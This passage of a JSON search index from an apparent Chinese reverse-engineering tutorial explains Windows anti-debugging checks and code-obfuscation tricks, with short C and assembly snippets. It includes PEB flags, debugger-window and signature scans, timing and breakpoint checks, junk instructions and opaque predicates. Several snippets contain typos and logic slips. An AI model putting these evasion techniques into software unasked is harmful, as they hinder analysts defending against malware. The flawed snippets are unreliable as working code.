\u81ea\u5e26\u7684\u516c\u5f00\u6216\u672a\u516c\u5f00\u7684\u51fd\u6570\u76f4\u63a5\u68c0\u6d4b\u7a0b\u5e8f\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u6700\u7b80\u5355\u7684\u8c03\u8bd5\u5668\u68c0\u6d4b\u51fd\u6570\u662f IsDebuggerPresent() \uff1a BOOL WINAPI IsDebuggerPresent(void); \u8be5\u51fd\u6570\u67e5\u8be2\u8fdb\u7a0b\u73af\u5883\u5757\uff08PEB\uff09\u4e2d\u7684 BeingDebugged \u6807\u5fd7\uff0c\u5982\u679c\u8fdb\u7a0b\u5904\u5728\u8c03\u8bd5\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u975e\u96f6\u503c\uff0c\u5426\u5219\u8fd4\u56de\u96f6\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { return IsDebuggerPresent(); } CheckRemoteDebuggerPresent() \u7528\u4e8e\u68c0\u6d4b\u4e00\u4e2a\u8fdc\u7a0b\u8fdb\u7a0b\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\uff1a BOOL WINAPI CheckRemoteDebuggerPresent( _In_ HANDLE hProcess, _Inout_ PBOOL pbDebuggerPresent ); \u5982\u679c hProcess \u53e5\u67c4\u8868\u793a\u7684\u8fdb\u7a0b\u5904\u4e8e\u8c03\u8bd5\u4e0a\u4e0b\u6587\uff0c\u5219\u8bbe\u7f6e pbDebuggerPresent \u53d8\u91cf\u88ab\u8bbe\u7f6e\u4e3a TRUE \uff0c\u5426\u5219\u88ab\u8bbe\u7f6e\u4e3a FALSE \u3002 BOOL CheckDebug() { BOOL ret; CheckRemoteDebuggerPresent(GetCurrentProcess(), &ret); return ret; } NtQueryInformationProcess \u7528\u4e8e\u83b7\u53d6\u7ed9\u5b9a\u8fdb\u7a0b\u7684\u4fe1\u606f\uff1a NTSTATUS WINAPI NtQueryInformationProcess( _In_ HANDLE ProcessHandle, _In_ PROCESSINFOCLASS ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength ); \u7b2c\u4e8c\u4e2a\u53c2\u6570 ProcessInformationClass \u7ed9\u5b9a\u4e86\u9700\u8981\u67e5\u8be2\u7684\u8fdb\u7a0b\u4fe1\u606f\u7c7b\u578b\u3002\u5f53\u7ed9\u5b9a\u503c\u4e3a 0 \uff08 ProcessBasicInformation \uff09\u6216 7 \uff08 ProcessDebugPort \uff09\u65f6\uff0c\u5c31\u80fd\u5f97\u5230\u76f8\u5173\u8c03\u8bd5\u4fe1\u606f\uff0c\u8fd4\u56de\u4fe1\u606f\u4f1a\u5199\u5230\u7b2c\u4e09\u4e2a\u53c2\u6570 ProcessInformation \u6307\u5411\u7684\u7f13\u51b2\u533a\u4e2d\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { DWORD dbgport = 0; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 7, &dbgPort, sizeof(dbgPort), NULL); return dbgPort != 0; }","title":"\u51fd\u6570\u68c0\u6d4b"},{"location":"Tutorial/Material/Reverse/#_55","text":"\u6570\u636e\u68c0\u6d4b\u662f\u6307\u7a0b\u5e8f\u901a\u8fc7\u6d4b\u8bd5\u4e00\u4e9b\u4e0e\u8c03\u8bd5\u76f8\u5173\u7684\u5173\u952e\u4f4d\u7f6e\u7684\u6570\u636e\u6765\u5224\u65ad\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u6bd4\u5982\u4e0a\u9762\u6240\u8bf4\u7684 PEB \u4e2d\u7684 BeingDebugged \u53c2\u6570\u3002\u6570\u636e\u68c0\u6d4b\u5c31\u662f\u76f4\u63a5\u5b9a\u4f4d\u5230\u8fd9\u4e9b\u6570\u636e\u5730\u5740\u5e76\u6d4b\u8bd5\u5176\u4e2d\u7684\u6570\u636e\uff0c\u4ece\u800c\u907f\u514d\u8c03\u7528\u51fd\u6570\uff0c\u4f7f\u7a0b\u5e8f\u7684\u884c\u4e3a\u66f4\u52a0\u9690\u853d\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { int BeingDebug = 0; __asm { mov eax, dword ptr fs:[30h] ; \u6307\u5411PEB\u57fa\u5730\u5740 mov eax, dword ptr [eax+030h] movzx eax, byte ptr [eax+2] mov BeingDebug, eax } return BeingDebug != 0; } \u7531\u4e8e\u8c03\u8bd5\u5668\u4e2d\u542f\u52a8\u7684\u8fdb\u7a0b\u4e0e\u6b63\u5e38\u542f\u52a8\u7684\u8fdb\u7a0b\u521b\u5efa\u5806\u7684\u65b9\u5f0f\u6709\u4e9b\u4e0d\u540c\uff0c\u7cfb\u7edf\u4f7f\u7528 PEB \u7ed3\u6784\u504f\u79fb\u91cf 0x68 \u5904\u7684\u4e00\u4e2a\u672a\u516c\u5f00\u7684\u4f4d\u7f6e\uff0c\u6765\u51b3\u5b9a\u5982\u679c\u521b\u5efa\u5806\u7ed3\u6784\u3002\u5982\u679c\u8fd9\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u503c\u4e3a 0x70 \uff0c\u5219\u8fdb\u7a0b\u5904\u4e8e\u8c03\u8bd5\u5668\u4e2d\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { int BeingDbg = 0; __asm { mov eax, dword ptr fs:[30h] mov eax, dword ptr [eax + 68h] and eax, 0x70 mov BeingDbg, eax } return BeingDbg != 0; }","title":"\u6570\u636e\u68c0\u6d4b"},{"location":"Tutorial/Material/Reverse/#_56","text":"\u7b26\u53f7\u68c0\u6d4b\u4e3b\u8981\u9488\u5bf9\u4e00\u4e9b\u4f7f\u7528\u4e86\u9a71\u52a8\u7684\u8c03\u8bd5\u5668\u6216\u76d1\u89c6\u5668\uff0c\u8fd9\u7c7b\u8c03\u8bd5\u5668\u5728\u542f\u52a8\u540e\u4f1a\u521b\u5efa\u76f8\u5e94\u7684\u9a71\u52a8\u94fe\u63a5\u7b26\u53f7\uff0c\u4ee5\u7528\u4e8e\u5e94\u7528\u5c42\u4e0e\u5176\u9a71\u52a8\u7684\u901a\u4fe1\u3002\u4f46\u7531\u4e8e\u8fd9\u4e9b\u7b26\u53f7\u4e00\u822c\u90fd\u6bd4\u8f83\u56fa\u5b9a\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u7b26\u53f7\u6765\u786e\u5b9a\u662f\u5426\u5b58\u5728\u76f8\u5e94\u7684\u8c03\u8bd5\u8f6f\u4ef6\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { HANDLE hDevice = CreateFileA(\"\\\\\\\\.\\\\PROCEXP153\", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0); if (hDevice) { return 0; } }","title":"\u7b26\u53f7\u68c0\u6d4b"},{"location":"Tutorial/Material/Reverse/#_57","text":"\u7a97\u53e3\u68c0\u6d4b\u901a\u8fc7\u68c0\u6d4b\u5f53\u524d\u684c\u9762\u4e2d\u662f\u5426\u5b58\u5728\u7279\u5b9a\u7684\u8c03\u8bd5\u7a97\u53e3\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u8c03\u8bd5\u5668\uff0c\u4f46\u4e0d\u80fd\u5224\u65ad\u8be5\u8c03\u8bd5\u5668\u662f\u5426\u6b63\u5728\u8c03\u8bd5\u8be5\u7a0b\u5e8f\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { if (FindWindowA(\"OllyDbg\", 0)) { return 0; } return 1; }","title":"\u7a97\u53e3\u68c0\u6d4b"},{"location":"Tutorial/Material/Reverse/#_58","text":"\u7279\u5f81\u7801\u68c0\u6d4b\u679a\u4e3e\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u5e76\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u641c\u7d22\u7279\u5b9a\u8c03\u8bd5\u5668\u7684\u4ee3\u7801\u7247\u6bb5\u3002 \u4f8b\u5982 OllyDbg \u6709\u8fd9\u6837\u4e00\u6bb5\u7279\u5f81\u7801\uff1a 0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00, 0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00, 0x4b, 0x00, 0x00, 0x00 \u793a\u4f8b\uff1a BOOL CheckDebug() { BYTE sign[] = {0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00, 0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00, 0x4b, 0x00, 0x00, 0x00;} PROCESSENTRY32 sentry32 = {0}; sentry32.dwSize = sizeof(sentry32); HANDLE phsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); Process32First(phsnap, &sentry32); do{ HANDLE hps = OpenProcess(MAXIMUM_ALLOWED, FALSE, sentry32.th32ProcessID); if (hps != 0) { DWORD szReaded = 0; BYTE signRemote[sizeof(sign)]; ReadProcessMemory(hps, (LPCVOID)0x4f632a, signRemote, sizeof(signRemote), &szReaded); if (szReaded > 0) { if (memcmp(sign, signRemote, sizeof(sign)) == 0) { CloseHandle(phsnap); return 0; } } } } sentry32.dwSize = sizeof(sentry32); }while(Process32Next(phsnap, &sentry32));","title":"\u7279\u5f81\u7801\u68c0\u6d4b"},{"location":"Tutorial/Material/Reverse/#_59","text":"\u884c\u4e3a\u68c0\u6d4b\u662f\u6307\u5728\u7a0b\u5e8f\u4e2d\u901a\u8fc7\u4ee3\u7801\u611f\u77e5\u7a0b\u5e8f\u5904\u4e8e\u8c03\u8bd5\u65f6\u4e0e\u672a\u5904\u4e8e\u8c03\u8bd5\u65f6\u7684\u5404\u79cd\u5dee\u5f02\u6765\u5224\u65ad\u7a0b\u5e8f\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u4f8b\u5982\u6211\u4eec\u5728\u8c03\u8bd5\u65f6\u6b65\u8fc7\u4e24\u6761\u6307\u4ee4\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u8fdc\u8fdc\u8d85\u8fc7 CPU \u6b63\u5e38\u6267\u884c\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u901a\u8fc7 rdtsc \u6307\u4ee4\u6765\u8fdb\u884c\u6d4b\u8bd5\u3002\uff08\u8be5\u6307\u4ee4\u7528\u4e8e\u5c06\u65f6\u95f4\u6807\u7b7e\u8ba1\u6570\u5668\u8bfb\u5165 EDX:EAX \u5bc4\u5b58\u5668\uff09 \u793a\u4f8b\uff1a BOOL CheckDebug() { int BeingDbg = 0; __asm { rdtsc mov ecx, edx rdtsc sub edx, ecx mov BeingDbg, edx } if (BeingDbg > 2) { return 0; } return 1; }","title":"\u884c\u4e3a\u68c0\u6d4b"},{"location":"Tutorial/Material/Reverse/#_60","text":"\u65ad\u70b9\u68c0\u6d4b\u662f\u6839\u636e\u8c03\u8bd5\u5668\u8bbe\u7f6e\u65ad\u70b9\u7684\u539f\u7406\u6765\u68c0\u6d4b\u8f6f\u4ef6\u4ee3\u7801\u4e2d\u662f\u5426\u8bbe\u7f6e\u4e86\u65ad\u70b9\u3002\u8c03\u8bd5\u5668\u4e00\u822c\u4f7f\u7528\u4e24\u8005\u65b9\u6cd5\u8bbe\u7f6e\u4ee3\u7801\u65ad\u70b9\uff1a \u901a\u8fc7\u4fee\u6539\u4ee3\u7801\u6307\u4ee4\u4e3a INT3\uff08\u673a\u5668\u7801\u4e3a0xCC\uff09\u89e6\u53d1\u8f6f\u4ef6\u5f02\u5e38 \u901a\u8fc7\u786c\u4ef6\u8c03\u8bd5\u5bc4\u5b58\u5668\u8bbe\u7f6e\u786c\u4ef6\u65ad\u70b9 \u9488\u5bf9\u8f6f\u4ef6\u65ad\u70b9\uff0c\u68c0\u6d4b\u7cfb\u7edf\u4f1a\u626b\u63cf\u6bd4\u8f83\u91cd\u8981\u7684\u4ee3\u7801\u533a\u57df\uff0c\u770b\u662f\u5426\u5b58\u5728\u591a\u4f59\u7684 INT3 \u6307\u4ee4\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { PIMAGE_DOS_HEADER pDosHeader; PIMAGE_NT_HEADERS32 pNtHeaders; PIMAGE_SECTION_HEADER pSectionHeader; DWORD dwBaseImage = (DWORD)GetModuleHandle(NULL); pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage; pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader->e_lfanew); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(pNtHeaders->Signature) + sizeof(IMAGE_FILE_HEADER) + (WORD)pNtHeaders->FileHeader.SizeOfOptionalHeader); DWORD dwAddr = pSectionHeader->VirtualAddress + dwBaseImage; DWORD dwCodeSize = pSectionHeader->SizeOfRawData; BOOL Found = FALSE; __asm { cld mov edi,dwAddr mov ecx,dwCodeSize mov al,0CCH repne scasb ; \u5728EDI\u6307\u5411\u5927\u5c0f\u4e3aECX\u7684\u7f13\u51b2\u533a\u4e2d\u641c\u7d22AL\u5305\u542b\u7684\u5b57\u8282 jnz NotFound mov Found,1 NotFound: } return Found; } \u800c\u5bf9\u4e8e\u786c\u4ef6\u65ad\u70b9\uff0c\u7531\u4e8e\u7a0b\u5e8f\u5de5\u4f5c\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u65e0\u6cd5\u8bbf\u95ee\u786c\u4ef6\u8c03\u8bd5\u65ad\u70b9\uff0c\u6240\u4ee5\u4e00\u822c\u9700\u8981\u6784\u5efa\u5f02\u5e38\u7a0b\u5e8f\u6765\u83b7\u53d6 DR \u5bc4\u5b58\u5668\u7684\u503c\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { CONTEXT context; HANDLE hThread = GetCurrentThread(); context.ContextFlags = CONTEXT_DEBUG_REGISTERS; GetThreadContext(hThread, &context); if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3!=0) { return 1; } return 0; }","title":"\u65ad\u70b9\u68c0\u6d4b"},{"location":"Tutorial/Material/Reverse/#_61","text":"\u884c\u4e3a\u5360\u7528\u662f\u6307\u5728\u9700\u8981\u4fdd\u62a4\u7684\u7a0b\u5e8f\u4e2d\uff0c\u7a0b\u5e8f\u81ea\u8eab\u5c06\u4e00\u4e9b\u53ea\u80fd\u540c\u65f6\u6709 1 \u4e2a\u5b9e\u4f8b\u7684\u529f\u80fd\u5360\u4e3a\u5df1\u7528\u3002\u6bd4\u5982\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u80fd\u540c\u65f6\u88ab 1 \u4e2a\u8c03\u8bd5\u5668\u8c03\u8bd5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8bbe\u8ba1\u4e00\u79cd\u6a21\u5f0f\uff0c\u5c06\u7a0b\u5e8f\u4ee5\u8c03\u8bd5\u65b9\u5f0f\u542f\u52a8\uff0c\u7136\u540e\u5229\u7528\u7cfb\u7edf\u7684\u8c03\u8bd5\u673a\u5236\u9632\u6b62\u88ab\u5176\u4ed6\u8c03\u8bd5\u5668\u8c03\u8bd5\u3002","title":"\u884c\u4e3a\u5360\u7528"},{"location":"Tutorial/Material/Reverse/#_62","text":"\u4e3a\u4ec0\u4e48\u9700\u8981\u6307\u4ee4\u6df7\u6dc6 \u5e38\u89c1\u7684\u6df7\u6dc6\u65b9\u6cd5 \u4ee3\u7801\u865a\u62df\u5316","title":"\u6307\u4ee4\u6df7\u6dc6"},{"location":"Tutorial/Material/Reverse/#_63","text":"\u8f6f\u4ef6\u7684\u5b89\u5168\u6027\u4e25\u91cd\u4f9d\u8d56\u4e8e\u4ee3\u7801\u590d\u6742\u5316\u540e\u88ab\u5206\u6790\u8005\u7406\u89e3\u7684\u96be\u5ea6\uff0c\u901a\u8fc7\u6307\u4ee4\u6df7\u6dc6\uff0c\u53ef\u4ee5\u5c06\u539f\u59cb\u7684\u4ee3\u7801\u6307\u4ee4\u8f6c\u6362\u4e3a\u7b49\u4ef7\u4f46\u6781\u5176\u590d\u6742\u7684\u6307\u4ee4\uff0c\u4ece\u800c\u5c3d\u53ef\u80fd\u5730\u63d0\u9ad8\u5206\u6790\u548c\u7834\u89e3\u7684\u6210\u672c\u3002","title":"\u4e3a\u4ec0\u4e48\u9700\u8981\u6307\u4ee4\u6df7\u6dc6"},{"location":"Tutorial/Material/Reverse/#_64","text":"","title":"\u5e38\u89c1\u7684\u6df7\u6dc6\u65b9\u6cd5"},{"location":"Tutorial/Material/Reverse/#_65","text":"\u4ee3\u7801\u53d8\u5f62\u662f\u6307\u5c06\u5355\u6761\u6216\u591a\u6761\u6307\u4ee4\u8f6c\u53d8\u4e3a\u7b49\u4ef7\u7684\u5355\u6761\u6216\u591a\u6761\u5176\u4ed6\u6307\u4ee4\u3002\u5176\u4e2d\u5bf9\u5355\u6761\u6307\u4ee4\u7684\u53d8\u5f62\u53eb\u505a\u5c40\u90e8\u53d8\u5f62\uff0c\u5bf9\u591a\u6761\u6307\u4ee4\u7ed3\u5408\u8d77\u6765\u8003\u8651\u7684\u53d8\u6210\u53eb\u505a\u5168\u5c40\u53d8\u5f62\u3002 \u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\u7684\u4e00\u6761\u8d4b\u503c\u6307\u4ee4\uff1a mov eax, 12345678h \u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u7ec4\u5408\u6307\u4ee4\u6765\u66ff\u4ee3\uff1a push 12345678h pop eax \u66f4\u8fdb\u4e00\u6b65\uff1a pushfd mov eax, 1234 shl eax, 10 mov ax, 5678 popfd pushfd \u548c popfd \u662f\u4e3a\u4e86\u4fdd\u62a4 EFLAGS \u5bc4\u5b58\u5668\u4e0d\u53d7\u53d8\u5f62\u540e\u6307\u4ee4\u7684\u5f71\u54cd\u3002 \u7ee7\u7eed\u66ff\u6362\uff1a pushfd push 1234 pop eax shl eax, 10 mov ax 5678 \u8fd9\u6837\u7684\u7ed3\u679c\u5c31\u662f\u7b80\u5355\u7684\u6307\u4ee4\u4e5f\u53ef\u80fd\u4f1a\u53d8\u6210\u4e0a\u767e\u4e0a\u5343\u6761\u6307\u4ee4\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u7406\u89e3\u7684\u96be\u5ea6\u3002 \u518d\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a jmp {label} \u53ef\u4ee5\u53d8\u6210\uff1a push {label} ret \u800c\u4e14 IDA \u4e0d\u80fd\u8bc6\u522b\u51fa\u8fd9\u79cd label \u6807\u7b7e\u7684\u8c03\u7528\u7ed3\u6784\u3002 \u6307\u4ee4\uff1a call {label} \u53ef\u4ee5\u66ff\u6362\u6210\uff1a push {call\u6307\u4ee4\u540e\u9762\u7684\u90a3\u4e2alabel} push {label} ret \u6307\u4ee4\uff1a push {op} \u53ef\u4ee5\u66ff\u6362\u6210\uff1a sub esp, 4 mov [esp], {op} \u4e0b\u9762\u6211\u4eec\u6765\u770b\u770b\u5168\u5c40\u53d8\u5f62\u3002\u5bf9\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\uff1a mov eax, ebx mov ecx, eax \u56e0\u4e3a\u4e24\u6761\u4ee3\u7801\u5177\u6709\u5173\u8054\u6027\uff0c\u5728\u53d8\u5f62\u65f6\u9700\u8981\u7efc\u5408\u8003\u8651\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a mov cx, bx mov ax, cx mov ch, bh mov ah, bh \u8fd9\u79cd\u5177\u6709\u5173\u8054\u6027\u7684\u7279\u5b9a\u4f7f\u5f97\u901a\u8fc7\u53d8\u5f62\u540e\u7684\u4ee3\u7801\u63a8\u5bfc\u53d8\u5f62\u524d\u7684\u4ee3\u7801\u66f4\u52a0\u56f0\u96be\u3002","title":"\u4ee3\u7801\u53d8\u5f62"},{"location":"Tutorial/Material/Reverse/#_66","text":"\u82b1\u6307\u4ee4\u5c31\u662f\u5728\u539f\u59cb\u6307\u4ee4\u4e2d\u63d2\u5165\u4e00\u4e9b\u867d\u7136\u53ef\u4ee5\u88ab\u6267\u884c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528\u7684\u6307\u4ee4\uff0c\u5b83\u7684\u51fa\u73b0\u53ea\u662f\u4e3a\u4e86\u6270\u4e71\u5206\u6790\uff0c\u4e0d\u4ec5\u662f\u5bf9\u5206\u6790\u8005\u6765\u8bf4\uff0c\u8fd8\u662f\u5bf9\u53cd\u6c47\u7f16\u5668\u3001\u8c03\u8bd5\u5668\u6765\u8bf4\u3002 \u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u539f\u59cb\u6307\u4ee4\u5982\u4e0b\uff1a add eax, ebx mul ecx \u52a0\u5165\u82b1\u6307\u4ee4\u4e4b\u540e\uff1a xor esi, 011223344h add esi, eax add eax, ebx mov edx, eax shl edx, 4 mul ecx xor esi, ecx \u5176\u4e2d\u4f7f\u7528\u4e86\u6e90\u7a0b\u5e8f\u4e0d\u4f1a\u4f7f\u7528\u5230\u7684 esi \u548c edx \u5bc4\u5b58\u5668\u3002\u8fd9\u5c31\u662f\u4e00\u79cd\u7eaf\u7cb9\u7684\u5783\u573e\u6307\u4ee4\u3002 \u6709\u7684\u82b1\u6307\u4ee4\u7528\u4e8e\u5e72\u6270\u53cd\u6c47\u7f16\u5668\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a 01003689 50 push eax 0100368A 53 push ebx \u52a0\u5165\u82b1\u6307\u4ee4\u540e\uff1a 01003689 50 push eax 0100368A EB 01 jmp short 0100368D 0100368C FF53 6A call dword ptr [ebx+6A] \u4e4d\u4e00\u770b\u4f3c\u4e4e\u5f88\u5947\u602a\uff0c\u5176\u5b9e\u662f\u52a0\u5165\u56e0\u4e3a\u52a0\u5165\u4e86\u673a\u5668\u7801 EB 01 FF \uff0c\u4f7f\u5f97\u7ebf\u6027\u5206\u6790\u7684\u53cd\u6c47\u7f16\u5668\u4ea7\u751f\u4e86\u8bef\u5224\u3002\u800c\u5728\u6267\u884c\u65f6\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u4f1a\u8df3\u8f6c\u5230\u6b63\u786e\u7684\u4f4d\u7f6e\uff0c\u6d41\u7a0b\u5982\u4e0b\uff1a 01003689 50 push eax 0100368A EB 01 jmp short 0100368D 0100368C 90 nop 0100368D 53 push ebx","title":"\u82b1\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#_67","text":"\u6307\u4ee4\u4e00\u822c\u90fd\u662f\u6309\u7167\u4e00\u5b9a\u5e8f\u5217\u6267\u884c\u7684\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a 01003689 push eax 0100368A push ebx 0100368B xor eax, eax 0100368D cmp eax, 0 01003690 jne short 01003695 01003692 inc eax 01003693 jmp short 0100368D 01003695 pop ebx 01003696 pop eax \u6307\u4ee4\u5e8f\u5217\u770b\u8d77\u6765\u5f88\u6e05\u6670\uff0c\u6240\u4ee5\u6270\u4e71\u6307\u4ee4\u5e8f\u5217\u5c31\u662f\u8981\u6253\u4e71\u8fd9\u79cd\u6307\u4ee4\u7684\u6392\u5217\u65b9\u5f0f\uff0c\u4ee5\u5e72\u6270\u5206\u6790\u8005\uff1a 01003689 push eax 0100368A jmp short 01003694 0100368C xor eax, eax 0100368E jmp short 01003697 01003690 jne short 0100369F 01003692 jmp short 0100369C 01003694 push ebx 01003695 jmp short 0100368C 01003697 cmp eax, 0 0100369A jmp short 01003690 0100369C inc eax 0100369D jmp short 01003697 0100369F pop ebx 010036A0 pop eax \u867d\u7136\u770b\u8d77\u6765\u5f88\u4e71\uff0c\u4f46\u771f\u5b9e\u7684\u6267\u884c\u987a\u5e8f\u6ca1\u6709\u6539\u53d8\u3002","title":"\u6270\u4e71\u6307\u4ee4\u5e8f\u5217"},{"location":"Tutorial/Material/Reverse/#_68","text":"\u591a\u5206\u652f\u662f\u6307\u5229\u7528\u4e0d\u540c\u7684\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u590d\u6742\u5316\u3002\u4e0e\u6270\u4e71\u6307\u4ee4\u5e8f\u5217\u4e0d\u540c\u7684\u65f6\uff0c\u591a\u5206\u652f\u6539\u53d8\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1a 01003689 push eax 0100368A push ebx 0100368B push ecx 0100368C push edx \u53d8\u5f62\u5982\u4e0b\uff1a 01003689 push eax 0100368A je short 0100368F 0100368C push ebx 0100368D jmp short 01003690 0100368F push ebx 01003690 push ecx 01003691 push edx \u4ee3\u7801\u91cc\u52a0\u5165\u4e86\u4e00\u4e2a\u6761\u4ef6\u5206\u652f\uff0c\u4f46\u5b83\u7a76\u7adf\u4f1a\u4e0d\u4f1a\u89e6\u53d1\u6211\u4eec\u5e76\u4e0d\u5173\u5fc3\u3002\u4e8e\u662f\u7a0b\u5e8f\u5177\u6709\u4e86\u4e0d\u786e\u5b9a\u6027\uff0c\u9700\u8981\u5728\u6267\u884c\u65f6\u624d\u80fd\u786e\u5b9a\u3002\u4f46\u53ef\u4ee5\u80af\u5b9a\u7684\u65f6\uff0c\u8fd9\u6bb5\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\u548c\u539f\u4ee3\u7801\u76f8\u540c\u3002 \u518d\u6539\u8fdb\u4e00\u4e0b\uff0c\u7528\u4e0d\u540c\u7684\u4ee3\u7801\u66ff\u6362\u5206\u652f\u5904\u7684\u4ee3\u7801\uff1a 01003689 push eax 0100368A je short 0100368F 0100368C push ebx 0100368D jmp short 01003693 0100368F push eax 01003690 mov dword ptr [esp], ebx 01003693 push ecx 01003694 push edx","title":"\u591a\u5206\u652f"},{"location":"Tutorial/Material/Reverse/#_69","text":"\u4e0d\u900f\u660e\u8c13\u8bcd\u662f\u6307\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u5728\u6267\u884c\u5230\u67d0\u5904\u65f6\uff0c\u5bf9\u7a0b\u5e8f\u5458\u800c\u8a00\u662f\u5df2\u77e5\u7684\uff0c\u4f46\u7f16\u8bd1\u5668\u6216\u9759\u6001\u5206\u6790\u5668\u65e0\u6cd5\u63a8\u65ad\u51fa\u8fd9\u4e2a\u503c\uff0c\u53ea\u80fd\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\u3002\u4e0a\u9762\u7684\u591a\u5206\u652f\u5176\u5b9e\u4e5f\u662f\u5229\u7528\u4e86\u4e0d\u900f\u660e\u8c13\u8bcd\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\uff1a mov esi, 1 ... ; some code not touching esi dec esi ... cmp esi, 0 jz real_code ; fake luggage real_code: \u5047\u8bbe\u6211\u4eec\u77e5\u9053\u8fd9\u91cc esi \u7684\u503c\u80af\u5b9a\u662f 0\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728 fake luggage \u5904\u63d2\u5165\u4efb\u610f\u957f\u5ea6\u548c\u590d\u6742\u5ea6\u7684\u6307\u4ee4\uff0c\u4ee5\u8fbe\u5230\u6df7\u6dc6\u7684\u76ee\u7684\u3002 \u5176\u5b83\u7684\u4f8b\u5b50\u8fd8\u6709\uff08\u540c\u6837\u5047\u8bbeesi\u4e3a0\uff09\uff1a add eax, ebx mul ecx add eax, esi","title":"\u4e0d\u900f\u660e\u8c13\u8bcd"},{"location":"Tutorial/Material/Reverse/#_70","text":"dummy_data1 db 100h dup (0) message1 db 'hello world', 0 dummy_data2 db 200h dup (0) message2 db 'another message', 0 func proc ... mov eax, offset dummy_data1 add eax, 100h push eax call dump_string ... mov eax, offset dummy_data2 add eax, 200h push eax call dump_string ... func endp \u8fd9\u91cc\u901a\u8fc7 dummy_data \u6765\u95f4\u63a5\u5730\u5f15\u7528 message\uff0c\u4f46 IDA \u5c31\u4e0d\u80fd\u6b63\u786e\u5730\u5206\u6790\u5230\u5bf9 message \u7684\u5f15\u7528\u3002","title":"\u95f4\u63a5\u6307\u9488"},{"location":"Tutorial/Material/Reverse/#_71","text":"\u57fa\u4e8e\u865a\u62df\u673a\u7684\u4ee3\u7801\u4fdd\u62a4\u4e5f\u53ef\u4ee5\u7b97\u662f\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u7684\u4e00\u79cd\uff0c\u662f\u76ee\u524d\u5404\u79cd\u6df7\u6dc6\u4e2d\u4fdd\u62a4\u6548\u679c\u6700\u597d\u7684\u3002\u7b80\u5355\u5730\u8bf4\uff0c\u8be5\u6280\u672f\u5c31\u662f\u901a\u8fc7\u8bb8\u591a\u6a21\u62df\u4ee3\u7801\u6765\u6a21\u62df\u88ab\u4fdd\u62a4\u7684\u4ee3\u7801\u7684\u6267\u884c\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u4e0e\u88ab\u4fdd\u62a4\u4ee3\u7801\u6267\u884c\u65f6\u76f8\u540c\u7684\u7ed3\